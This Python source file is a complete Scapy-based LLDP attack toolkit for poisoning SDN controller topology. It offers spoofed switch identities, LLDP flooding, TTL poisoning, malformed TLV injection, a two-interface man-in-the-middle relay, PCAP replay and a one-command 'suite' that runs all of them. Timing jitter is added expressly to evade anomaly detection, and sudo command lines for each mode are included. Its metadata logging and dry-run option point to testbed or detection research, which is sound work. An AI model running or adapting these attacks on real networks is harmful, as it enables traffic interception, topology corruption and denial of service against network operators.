#!/usr/bin/env python3
"""
LLDP Attack Toolkit for SDN Topology Poisoning
Complete attack suite with PCAP export and metadata logging.

Integrates from:
- github.com/Lamonkey/SDN_Topology_Attack (LLDP relay and spoofing)
- github.com/DichHuynh/Topology-Poisoning-Attack-in-SDN (topology poisoning patterns)
- github.com/SySS-Research/WireBug (TLV crafting and malformed packets)
- github.com/profxadke/replay (PCAP replay utility)
- github.com/GoozeyX/python_lldp (LLDP parsing and sniffing)
"""

import argparse
import json
import os
import random
import sys
import threading
import time
from datetime import datetime

from scapy.all import Ether, sendp, sniff, Raw, wrpcap, rdpcap, Dot1Q

# Scapy LLDP imports - compatible with multiple versions
try:
    from scapy.layers.l2 import (LLDPDU, LLDPDUChassisID, LLDPDUPortID,
                                  LLDPDUTimeToLive, LLDPDUEndOfLLDPDU, LLDPDUSystemName)
except ImportError:
    from scapy.layers.l2 import (LLDPDU, LLDPDUChassisId as LLDPDUChassisID,
                                  LLDPDUPortId as LLDPDUPortID, LLDPDPTTL as LLDPDUTimeToLive,
                                  LLDPDUEnd as LLDPDUEndOfLLDPDU, LLDPDUSystemName)

try:
    from scapy.layers.l2 import LLDPDUGenericOrganisationSpecific as LLDPDUOrgSpecific
except ImportError:
    try:
        from scapy.contrib.lldp import LLDPDUGenericOrganisationSpecific as LLDPDUOrgSpecific
    except ImportError:
        LLDPDUOrgSpecific = None

# LLDP CONSTANTS - From: IEEE 802.1AB
LLDP_MULTICAST = "01:80:c2:00:00:0e"
LLDP_ETHERTYPE = 0x88cc


# ATTACK METADATA TRACKING - From: Standard practice for testbed logging
class AttackMetadata:
    """Track attack execution metadata for benchmarking."""
    def __init__(self, attack_type, target_interface):
        self.attack_type = attack_type
        self.target_interface = target_interface
        self.start_time = time.time()
        self.end_time = None
        self.packets_sent = 0
        self.packets_captured = 0
        self.parameters = {}
        self.pcap_file = None

    def finish(self):
        self.end_time = time.time()

    def to_dict(self):
        return {
            "attack_type": self.attack_type,
            "target_interface": self.target_interface,
            "start_time": self.start_time,
            "end_time": self.end_time,
            "duration_sec": self.end_time - self.start_time if self.end_time else 0,
            "packets_sent": self.packets_sent,
            "packets_captured": self.packets_captured,
            "parameters": self.parameters,
            "pcap_file": self.pcap_file
        }

    def save(self, output_file="attack_meta.json"):
        with open(output_file, 'w') as f:
            json.dump(self.to_dict(), f, indent=2)
        print(f"[+] Metadata saved to {output_file}")


# TOKEN BUCKET RATE LIMITER
# From: Common rate limiting pattern (used in github.com/bucket4j/bucket4j, adapted for Python)
class TokenBucket:
    """Token bucket rate limiter for realistic traffic patterns with burst support."""
    def __init__(self, rate, capacity):
        self.rate = float(rate)
        self.capacity = float(capacity)
        self.tokens = float(capacity)
        self.last = time.monotonic()
        self.lock = threading.Lock()

    def consume(self, tokens=1.0):
        with self.lock:
            now = time.monotonic()
            delta = now - self.last
            self.tokens = min(self.capacity, self.tokens + delta * self.rate)
            self.last = now
            if self.tokens >= tokens:
                self.tokens -= tokens
                return True
            return False


# LLDP PACKET CRAFTING - From: github.com/SySS-Research/WireBug (TLV construction)
def build_lldp(chassis_id="scapy-attacker", port_id="eth0", ttl=120,
               system_name=None, org_tlvs=None, malformed=False, vlan=None):
    """
    Craft LLDP packet with configurable TLVs.

    Args:
        chassis_id: Chassis identifier (MAC or string)
        port_id: Port identifier
        ttl: Time to live in seconds
        system_name: Optional system name TLV
        org_tlvs: List of (oui_bytes, subtype, info_bytes) for vendor-specific TLVs
        malformed: If True, create invalid TLV ordering (IEEE 802.1AB violation)
        vlan: Optional VLAN ID for 802.1Q tagging
    """
    # Mandatory TLVs - From: IEEE 802.1AB Section 9.2.7
    chassis_id_bytes = chassis_id.encode() if isinstance(chassis_id, str) else chassis_id
    port_id_bytes = port_id.encode() if isinstance(port_id, str) else port_id

    chassis = LLDPDUChassisID(subtype=4, id=chassis_id_bytes)  # MAC address subtype
    port = LLDPDUPortID(subtype=7, id=port_id_bytes)  # Locally assigned
    ttl_tlv = LLDPDUTimeToLive(ttl=ttl)

    tlvs = [chassis, port, ttl_tlv]

    if system_name:
        tlvs.append(LLDPDUSystemName(system_name=system_name.encode() if isinstance(system_name, str) else system_name))

    # Organizational TLVs (vendor-specific) - From: IEEE 802.1AB-2009 Annex F
    if org_tlvs and LLDPDUOrgSpecific:
        for (oui, subtype, info) in org_tlvs:
            tlvs.append(LLDPDUOrgSpecific(oui=oui, subtype=subtype, data=info))

    # Malformed TLV injection - From: github.com/SySS-Research/WireBug
    if malformed:
        tlvs.insert(1, Raw(load=b"\x7f\xffBADLEN"))  # Invalid TLV at wrong position

    tlvs.append(LLDPDUEndOfLLDPDU())

    # Chain TLVs
    pkt = None
    for t in tlvs:
        pkt = t if pkt is None else pkt / t

    # Ethernet header
    eth = Ether(dst=LLDP_MULTICAST, type=LLDP_ETHERTYPE)

    # VLAN tagging - From: IEEE 802.1Q
    if vlan:
        eth = eth / Dot1Q(vlan=int(vlan))

    return eth / pkt


def send_loop(iface, pkt_builder, tb, duration, jitter, metadata, dry_run=False):
    """Send packets with rate limiting and jitter."""
    start = time.time()
    frames = []

    while not duration or (time.time() - start) < duration:
        while not tb.consume():
            time.sleep(0.001)

        # Jitter for timing randomization - evades time-series anomaly detection
        if jitter > 0:
            time.sleep(random.uniform(0, jitter))

        pkt = pkt_builder()
        if not dry_run:
            sendp(pkt, iface=iface, verbose=False)

        frames.append(pkt)
        metadata.packets_sent += 1

        if metadata.packets_sent % 100 == 0:
            print(f"    [{metadata.packets_sent}] packets sent...")

    return metadata.packets_sent, frames


# LLDP RELAY ATTACK - From: github.com/Lamonkey/SDN_Topology_Attack (relay attack)
def sniff_and_relay(in_iface, out_iface, duration=None, tb=None, two_nic=True, metadata=None, dry_run=False):
    """
    LLDP relay attack (MITM).
    Two modes: two_nic=True (live relay), two_nic=False (capture then replay)
    """
    captured = []
    stop_time = time.time() + duration if duration else None

    def pkt_handler(pkt):
        if not hasattr(pkt, 'type') or pkt.type != LLDP_ETHERTYPE:
            return
        if tb and not tb.consume():
            return

        if not dry_run:
            sendp(pkt, iface=out_iface, verbose=False)
        captured.append(pkt)

        if metadata:
            metadata.packets_sent += 1
        print(f"    [Relay] Forwarded LLDP packet ({len(captured)} total)")

    if two_nic:
        # Live relay
        print(f"    Sniffing LLDP on {in_iface}, forwarding to {out_iface}...")
        sniff(iface=in_iface, prn=pkt_handler,
              stop_filter=lambda x: stop_time and time.time() >= stop_time)
    else:
        # Capture then replay
        print(f"    Capturing LLDP on {in_iface} for {duration}s...")
        pkts = sniff(iface=in_iface, timeout=duration, filter=f"ether proto 0x{LLDP_ETHERTYPE:04x}")
        print(f"    Replaying {len(pkts)} packets to {out_iface}...")

        for p in pkts:
            if hasattr(p, 'type') and p.type == LLDP_ETHERTYPE:
                if tb:
                    while not tb.consume():
                        time.sleep(0.001)
                if not dry_run:
                    sendp(p, iface=out_iface, verbose=False)
                captured.append(p)
                if metadata:
                    metadata.packets_sent += 1

    return captured


# PCAP REPLAY - From: github.com/profxadke/replay (PCAP replay utility)
def replay_pcap(iface, pcap_file, tb, duration=None, metadata=None, dry_run=False):
    """Replay LLDP packets from PCAP file."""
    if not os.path.exists(pcap_file):
        print(f"[!] Error: PCAP file not found: {pcap_file}")
        return 0, []

    pkts = rdpcap(pcap_file)
    lldp_pkts = [p for p in pkts if hasattr(p, 'type') and p.type == LLDP_ETHERTYPE]

    if not lldp_pkts:
        print(f"[!] No LLDP packets found in {pcap_file}")
        return 0, []

    print(f"    Found {len(lldp_pkts)} LLDP packets in {pcap_file}")

    start = time.time()
    frames = []
    idx = 0

    while not duration or (time.time() - start) < duration:
        if idx >= len(lldp_pkts):
            break

        while not tb.consume():
            time.sleep(0.001)

        p = lldp_pkts[idx]
        if not dry_run:
            sendp(p, iface=iface, verbose=False)

        frames.append(p)
        if metadata:
            metadata.packets_sent += 1

        if (idx + 1) % 50 == 0:
            print(f"    [{idx + 1}] packets replayed...")
        idx += 1

    return len(frames), frames


# LLDP CAPTURE MODE - From: github.com/GoozeyX/python_lldp (LLDP sniffing)
def attack_capture(iface, duration=60, output_pcap="captured.pcap"):
    """Capture LLDP packets for reconnaissance."""
    print(f"[*] LLDP Capture Mode")
    print(f"    Interface: {iface} | Duration: {duration}s")

    meta = AttackMetadata("capture", iface)
    meta.parameters = {"duration_sec": duration}

    print(f"    Capturing LLDP packets...")
    captured = sniff(iface=iface, timeout=duration, filter=f"ether proto 0x{LLDP_ETHERTYPE:04x}")

    meta.packets_captured = len(captured)
    meta.finish()

    wrpcap(output_pcap, captured)
    meta.pcap_file = output_pcap
    print(f"[+] Captured {len(captured)} LLDP packets -> {output_pcap}")

    meta.save()
    return meta


def write_artifacts(run_name, frames, start_ts, stop_ts, metadata=None):
    """Write attack artifacts (PCAP and metadata)."""
    os.makedirs(run_name, exist_ok=True)
    pcap_path = os.path.join(run_name, "attack.pcap")
    meta_path = os.path.join(run_name, "attack_meta.json")

    if frames:
        wrpcap(pcap_path, frames)

    meta = {
        "start": datetime.utcfromtimestamp(start_ts).isoformat() + "Z",
        "stop": datetime.utcfromtimestamp(stop_ts).isoformat() + "Z",
        "count": len(frames),
    }

    if metadata:
        meta.update(metadata.to_dict())

    with open(meta_path, "w") as f:
        json.dump(meta, f, indent=2)

    return pcap_path, meta_path


def parse_tlvs_arg(tlvs_str_list):
    """Parse org TLV args. Format: OUI:subtype:hex (e.g., 001122:1:deadbeef)"""
    out = []
    for item in tlvs_str_list or []:
        try:
            oui, sub, info_hex = item.split(":", 2)
            out.append((bytes.fromhex(oui), int(sub), bytes.fromhex(info_hex)))
        except Exception as e:
            print(f"[!] Failed to parse org TLV '{item}': {e}")
    return out


def cli_main():
    parser = argparse.ArgumentParser(
        description="LLDP Attack Toolkit - SDN Topology Poisoning & Testing",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Attack Modes:
  spoof       - Forge chassis/port IDs to spoof switches
  flood       - High-rate LLDP flood with unique chassis IDs
  ttl_anomaly - TTL poisoning (0=immediate timeout, 65535=long-lived)
  malformed   - Invalid TLV ordering (IEEE 802.1AB violation)
  relay       - MITM relay between interfaces
  replay      - Replay LLDP from PCAP file
  discovery   - Broadcast discovery with randomized IDs
  capture     - Passive LLDP capture for reconnaissance
  suite       - Run all attacks in sequence (ONE COMMAND for full demo!)

Examples:
  # Run ALL attacks automatically (perfect for demos!)
  sudo python3 scapy_lldp_attacks.py --mode suite --iface eth0 --rate 50 --duration 60

  # Individual attacks
  sudo python3 scapy_lldp_attacks.py --mode flood --iface eth0 --rate 50 --duration 30
  sudo python3 scapy_lldp_attacks.py --mode spoof --iface eth0 --chassis "fake-sw" --port "eth1"
  sudo python3 scapy_lldp_attacks.py --mode ttl_anomaly --iface eth0 --ttl-anom-val 0
  sudo python3 scapy_lldp_attacks.py --mode capture --iface eth0 --duration 60

Advanced:
  --vlan 100                      # 802.1Q VLAN tagging
  --org "001122:1:deadbeef"       # Vendor-specific TLV
  --jitter 0.05                   # Timing randomization
  --dry-run                       # Test without sending
        """)

    parser.add_argument("--iface", required=True, help="Network interface")
    parser.add_argument("--out-iface", help="Output interface for two-NIC relay")
    parser.add_argument("--mode", required=True,
                        choices=["spoof", "relay", "flood", "ttl_anomaly", "malformed",
                                "replay", "discovery", "capture", "suite"],
                        help="Attack mode")

    # Rate control
    parser.add_argument("--rate", type=float, default=10.0, help="Packets/sec (default: 10)")
    parser.add_argument("--burst", type=int, default=50, help="Burst capacity (default: 50)")
    parser.add_argument("--jitter", type=float, default=0.01, help="Max jitter sec (default: 0.01)")
    parser.add_argument("--duration", type=float, default=10.0, help="Duration sec (default: 10)")

    # LLDP parameters
    parser.add_argument("--chassis", help="Chassis ID")
    parser.add_argument("--port", help="Port ID")
    parser.add_argument("--ttl", type=int, default=120, help="TTL value (default: 120)")
    parser.add_argument("--ttl-anom-val", type=int, default=1, help="TTL for ttl_anomaly (default: 1)")
    parser.add_argument("--system-name", help="System name TLV")

    # Advanced
    parser.add_argument("--org", action="append", help="Org TLV: OUI:sub:hex")
    parser.add_argument("--vlan", type=int, help="802.1Q VLAN ID")
    parser.add_argument("--malformed", action="store_true", help="Enable malformed TLV")

    # PCAP
    parser.add_argument("--pcap-in", help="Input PCAP for replay")
    parser.add_argument("--pcap-out", default="attack.pcap", help="Output PCAP")
    parser.add_argument("--dry-run", action="store_true", help="Don't send packets")
    parser.add_argument("--run-name", default="run_" + datetime.utcnow().strftime("%Y%m%dT%H%M%SZ"))

    args = parser.parse_args()

    print(f"\n{'='*60}\nLLDP Attack Toolkit\n{'='*60}\n")

    tb = TokenBucket(rate=args.rate, capacity=args.burst)
    org_tlvs = parse_tlvs_arg(args.org)
    metadata = AttackMetadata(args.mode, args.iface)

    start_ts = time.time()
    frames = []
    count = 0

    try:
        # SPOOF MODE
        if args.mode == "spoof":
            chassis_id = args.chassis or "spoofed-switch"
            port_id = args.port or "eth0"
            print(f"[*] LLDP Spoofing Attack\n    Chassis: {chassis_id} | Port: {port_id} | Rate: {args.rate} pps")

            metadata.parameters = {"chassis_id": chassis_id, "port_id": port_id, "ttl": args.ttl,
                                  "rate_pps": args.rate, "vlan": args.vlan}

            builder = lambda: build_lldp(chassis_id, port_id, args.ttl, args.system_name,
                                        org_tlvs, vlan=args.vlan)
            count, frames = send_loop(args.iface, builder, tb, args.duration, args.jitter, metadata, args.dry_run)

        # FLOOD MODE - From: github.com/DichHuynh/Topology-Poisoning-Attack-in-SDN
        elif args.mode == "flood":
            chassis_base = args.chassis or "aa:bb:cc:dd:ee"
            print(f"[*] LLDP Flood Attack\n    Base: {chassis_base} | Rate: {args.rate} pps")

            metadata.parameters = {"chassis_base": chassis_base, "rate_pps": args.rate}

            pkt_count = [0]
            def flood_builder():
                chassis_id = f"{chassis_base}:{pkt_count[0]%256:02x}"
                port_id = f"flood_port_{pkt_count[0]}"
                pkt_count[0] += 1
                return build_lldp(chassis_id, port_id, args.ttl, vlan=args.vlan)

            count, frames = send_loop(args.iface, flood_builder, tb, args.duration, args.jitter, metadata, args.dry_run)

        # TTL ANOMALY - From: github.com/SySS-Research/WireBug (TTL manipulation)
        elif args.mode == "ttl_anomaly":
            chassis_id = args.chassis or "ttl-anomaly"
            port_id = args.port or "eth0"
            print(f"[*] LLDP TTL Anomaly Attack\n    TTL: {args.ttl_anom_val} | Rate: {args.rate} pps")

            metadata.parameters = {"chassis_id": chassis_id, "malicious_ttl": args.ttl_anom_val}

            builder = lambda: build_lldp(chassis_id, port_id, args.ttl_anom_val, args.system_name,
                                        org_tlvs, vlan=args.vlan)
            count, frames = send_loop(args.iface, builder, tb, args.duration, args.jitter, metadata, args.dry_run)

        # MALFORMED MODE - From: github.com/SySS-Research/WireBug (malformed packet crafting)
        elif args.mode == "malformed":
            chassis_id = args.chassis or "malformed-switch"
            port_id = args.port or "eth0"
            print(f"[*] LLDP Malformed TLV Attack\n    Rate: {args.rate} pps")

            metadata.parameters = {"chassis_id": chassis_id, "malformed": True}

            builder = lambda: build_lldp(chassis_id, port_id, args.ttl, args.system_name,
                                        org_tlvs, malformed=True, vlan=args.vlan)
            count, frames = send_loop(args.iface, builder, tb, args.duration, args.jitter, metadata, args.dry_run)

        # RELAY MODE - From: github.com/Lamonkey/SDN_Topology_Attack
        elif args.mode == "relay":
            out_iface = args.out_iface or args.iface
            two_nic = bool(args.out_iface)
            print(f"[*] LLDP Relay Attack (MITM)\n    {args.iface} -> {out_iface} | Mode: {'Two-NIC' if two_nic else 'Single-NIC'}")

            metadata.parameters = {"sniff_iface": args.iface, "forward_iface": out_iface, "two_nic": two_nic}

            frames = sniff_and_relay(args.iface, out_iface, args.duration, tb, two_nic, metadata, args.dry_run)
            count = len(frames)

        # REPLAY MODE - From: github.com/profxadke/replay
        elif args.mode == "replay":
            if not args.pcap_in:
                print("[!] Error: --pcap-in required for replay mode")
                sys.exit(1)

            print(f"[*] LLDP Replay Attack\n    PCAP: {args.pcap_in} | Rate: {args.rate} pps")
            metadata.parameters = {"source_pcap": args.pcap_in, "rate_pps": args.rate}

            count, frames = replay_pcap(args.iface, args.pcap_in, tb, args.duration, metadata, args.dry_run)

        # DISCOVERY MODE
        elif args.mode == "discovery":
            print(f"[*] LLDP Discovery Mode\n    Rate: {args.rate} pps | Duration: {args.duration}s")
            metadata.parameters = {"mode": "discovery", "rate_pps": args.rate}

            builder = lambda: build_lldp(f"disc-{random.randint(1,9999)}",
                                        f"p{random.randint(1,65535)}",
                                        args.ttl, args.system_name, org_tlvs, vlan=args.vlan)
            count, frames = send_loop(args.iface, builder, tb, args.duration, args.jitter, metadata, args.dry_run)

        # SUITE MODE - Run all attacks in sequence
        elif args.mode == "suite":
            print(f"[*] LLDP Attack Suite - Running all attacks in sequence\n")

            all_frames = []
            suite_start = time.time()
            attack_duration = args.duration / 6  # Divide time among 6 active attacks

            attacks_run = []

            # 1. Spoof Attack
            print(f"\n{'='*60}\n[1/6] Running Spoof Attack ({attack_duration:.1f}s)\n{'='*60}")
            chassis_id = args.chassis or "spoofed-switch"
            port_id = args.port or "eth0"
            builder = lambda: build_lldp(chassis_id, port_id, args.ttl, args.system_name, org_tlvs, vlan=args.vlan)
            c, f = send_loop(args.iface, builder, tb, attack_duration, args.jitter, metadata, args.dry_run)
            all_frames.extend(f)
            attacks_run.append(f"Spoof: {c} packets")

            # 2. Flood Attack
            print(f"\n{'='*60}\n[2/6] Running Flood Attack ({attack_duration:.1f}s)\n{'='*60}")
            chassis_base = args.chassis or "aa:bb:cc:dd:ee"
            pkt_count = [0]
            def flood_builder():
                chassis_id = f"{chassis_base}:{pkt_count[0]%256:02x}"
                port_id = f"flood_port_{pkt_count[0]}"
                pkt_count[0] += 1
                return build_lldp(chassis_id, port_id, args.ttl, vlan=args.vlan)
            c, f = send_loop(args.iface, flood_builder, tb, attack_duration, args.jitter, metadata, args.dry_run)
            all_frames.extend(f)
            attacks_run.append(f"Flood: {c} packets")

            # 3. TTL Anomaly
            print(f"\n{'='*60}\n[3/6] Running TTL Anomaly Attack ({attack_duration:.1f}s)\n{'='*60}")
            chassis_id = "ttl-anomaly"
            port_id = "eth0"
            builder = lambda: build_lldp(chassis_id, port_id, args.ttl_anom_val, args.system_name, org_tlvs, vlan=args.vlan)
            c, f = send_loop(args.iface, builder, tb, attack_duration, args.jitter, metadata, args.dry_run)
            all_frames.extend(f)
            attacks_run.append(f"TTL Anomaly: {c} packets")

            # 4. Malformed TLV
            print(f"\n{'='*60}\n[4/6] Running Malformed TLV Attack ({attack_duration:.1f}s)\n{'='*60}")
            chassis_id = "malformed-switch"
            port_id = "eth0"
            builder = lambda: build_lldp(chassis_id, port_id, args.ttl, args.system_name, org_tlvs, malformed=True, vlan=args.vlan)
            c, f = send_loop(args.iface, builder, tb, attack_duration, args.jitter, metadata, args.dry_run)
            all_frames.extend(f)
            attacks_run.append(f"Malformed: {c} packets")

            # 5. Discovery
            print(f"\n{'='*60}\n[5/6] Running Discovery Attack ({attack_duration:.1f}s)\n{'='*60}")
            builder = lambda: build_lldp(f"disc-{random.randint(1,9999)}", f"p{random.randint(1,65535)}",
                                        args.ttl, args.system_name, org_tlvs, vlan=args.vlan)
            c, f = send_loop(args.iface, builder, tb, attack_duration, args.jitter, metadata, args.dry_run)
            all_frames.extend(f)
            attacks_run.append(f"Discovery: {c} packets")

            # 6. Spoof (different variant)
            print(f"\n{'='*60}\n[6/6] Running Spoof Attack Variant ({attack_duration:.1f}s)\n{'='*60}")
            chassis_id = "rogue-switch-2"
            port_id = "GigabitEthernet0/1"
            builder = lambda: build_lldp(chassis_id, port_id, 65535, "ROGUE_DEVICE", org_tlvs, vlan=args.vlan)  # TTL=65535 for persistence
            c, f = send_loop(args.iface, builder, tb, attack_duration, args.jitter, metadata, args.dry_run)
            all_frames.extend(f)
            attacks_run.append(f"Spoof Variant: {c} packets")

            suite_stop = time.time()
            count = len(all_frames)
            frames = all_frames

            print(f"\n{'='*60}")
            print(f"[+] Attack Suite Completed")
            print(f"{'='*60}")
            print(f"    Total Duration: {suite_stop - suite_start:.2f}s")
            print(f"    Total Packets: {count}")
            print(f"\n    Attack Breakdown:")
            for attack in attacks_run:
                print(f"      - {attack}")

            metadata.parameters = {"mode": "suite", "attacks_run": len(attacks_run), "attack_breakdown": attacks_run}
            metadata.packets_sent = count

        # CAPTURE MODE - From: github.com/GoozeyX/python_lldp
        elif args.mode == "capture":
            metadata = attack_capture(args.iface, args.duration, args.pcap_out)
            print(f"\n[+] Attack completed successfully")
            return 0

        # FINISH
        stop_ts = time.time()
        metadata.finish()

        print(f"\n[+] Attack completed\n    Packets: {count} | Duration: {stop_ts - start_ts:.2f}s")

        if frames:
            pcap_path, meta_path = write_artifacts(args.run_name, frames, start_ts, stop_ts, metadata)
            print(f"[+] Saved {len(frames)} frames -> {pcap_path}\n[+] Metadata -> {meta_path}")

        return 0

    except KeyboardInterrupt:
        print(f"\n[!] Interrupted by user")
        stop_ts = time.time()
        metadata.finish()

        if frames:
            pcap_path, meta_path = write_artifacts(args.run_name, frames, start_ts, stop_ts, metadata)
            print(f"[+] Saved {len(frames)} frames -> {pcap_path}")

        return 1

    except Exception as e:
        print(f"\n[!] Error: {e}")
        import traceback
        traceback.print_exc()
        return 1


if __name__ == "__main__":
    sys.exit(cli_main())
